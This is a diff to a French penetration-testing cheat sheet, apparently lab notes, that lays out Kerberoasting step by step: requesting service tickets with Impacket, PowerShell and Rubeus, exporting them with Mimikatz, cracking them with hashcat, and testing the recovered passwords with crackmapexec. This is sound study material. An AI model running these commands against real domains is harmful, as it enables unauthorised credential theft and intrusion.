@@ -900,6 +900,7 @@ Permet de collecter toutes les relations AD pour générer des graphes d’attaq
 ## 1. Installer Impacket
 
 Cloner et installer le toolkit :  
+
 `git clone https://github.com/fortra/impacket.git`  
 `cd impacket`  
 `sudo python3 -m pip install .`
@@ -907,14 +908,17 @@ Cloner et installer le toolkit :
 ## 2. Lister les comptes avec SPN
 
 Lister les comptes qui ont un SPN :  
+
 `GetUserSPNs.py -dc-ip <IP_DC> <DOMAINE>/<USER>`
 
 ## 3. Récupérer les tickets TGS (pour brute-force)
 
 **Tous les comptes avec SPN :**  
+
 `GetUserSPNs.py -dc-ip <IP_DC> <DOMAINE>/<USER> -request`
 
 **User précis :**  
+
 `GetUserSPNs.py -dc-ip <IP_DC> <DOMAINE>/<USER> -request-user <SPNUSER>`
 
 **Sauvegarder dans un fichier**  
@@ -923,11 +927,13 @@ Lister les comptes qui ont un SPN :
 ## 4. Cracker les tickets offline
 
 Avec Hashcat :  
+
 `hashcat -m 13100 kerberoast.hashes /usr/share/wordlists/rockyou.txt`
 
 ## 5. Valider les accès
 
 Tester le mot de passe cracké :  
+
 `crackmapexec smb <IP_DC> -u <USER> -p '<PASSWORD>'`
 
 ## Conseils
@@ -946,6 +952,7 @@ Tester le mot de passe cracké :
 ## 1. Énumération des SPN (manuelle)
 
 Lister les comptes avec SPN :
+
 `setspn.exe -Q */*`
 
 Rechercher uniquement les comptes utilisateurs (ignorer les comptes ordinateurs).
@@ -953,17 +960,21 @@ Rechercher uniquement les comptes utilisateurs (ignorer les comptes ordinateurs)
 ## 2. Demande d’un TGS pour un utilisateur spécifique (PowerShell)
 
 Charger l’assembly :
+
 `Add-Type -AssemblyName System.IdentityModel`
 
 Demander un ticket pour un SPN cible :
+
 `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "<SPN>"`
 
 Exemple :  
+
 `New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQLSvc/DEV-PRE-SQL.inlanefreight.local:1433"`
 
 ## 3. Extraction des tickets TGS de la mémoire avec Mimikatz
 
 Lancer Mimikatz et extraire les tickets :
+
 `kerberos::list /export`
 
 Générer les fichiers .kirbi (tickets Kerberos exportés).
@@ -971,25 +982,31 @@ Générer les fichiers .kirbi (tickets Kerberos exportés).
 ## 4. Préparation du ticket pour cracking (si export en base64)
 
 Remettre le blob base64 sur une seule ligne :  
+
 `echo "<base64 blob>" | tr -d \\n`
 
 Décode le fichier .kirbi :  
+
 `cat encoded_file | base64 -d > sqldev.kirbi`
 
 ## 5. Extraction du hash pour Hashcat
 
 Extraire le hash avec kirbi2john :
+
 `python2.7 kirbi2john.py sqldev.kirbi > crack_file`
 
 Préparer le format Hashcat (si nécessaire) :
+
 `sed 's/\$krb5tgs\$\(.*\):\(.*\)/\$krb5tgs\$23\$\*\1\*\$\2/' crack_file > sqldev_tgs_hashcat`
 
 ## 6. Cracking offline avec Hashcat
 
 Cracker avec RC4 (type 23) :
+
 `hashcat -m 13100 sqldev_tgs_hashcat /usr/share/wordlists/rockyou.txt`
 
 Pour AES-256 (type 18) :
+
 `hashcat -m 19700 aes_to_crack /usr/share/wordlists/rockyou.txt`
 
 ## 7. Méthodes automatisées (PowerView, Rubeus)
@@ -1015,26 +1032,33 @@ Exporter tous les tickets au format CSV :
 ### Rubeus
 
 Lister les options de Kerberoasting :
+
 `Rubeus.exe kerberoast /?`
 
 Kerberoasting simple :
+
 `Rubeus.exe kerberoast /nowrap`
 
 Kerberoasting avec filtre admincount :
+
 `Rubeus.exe kerberoast /ldapfilter:'admincount=1' /nowrap`
 
 Sortie dans un fichier :
+
 `Rubeus.exe kerberoast /outfile:hashes.txt /nowrap`
 
 Forcer RC4 si possible :
+
 `Rubeus.exe kerberoast /user:<user> /tgtdeleg /nowrap`
 
 Statistiques sur les comptes Kerberoastables :
+
 `Rubeus.exe kerberoast /stats`
 
 ## 8. Vérification et cracking final
 
 Vérifier le hash extrait :
+
 `cat sqldev_tgs_hashcat`
 
 Lancer Hashcat selon le type de hash trouvé.
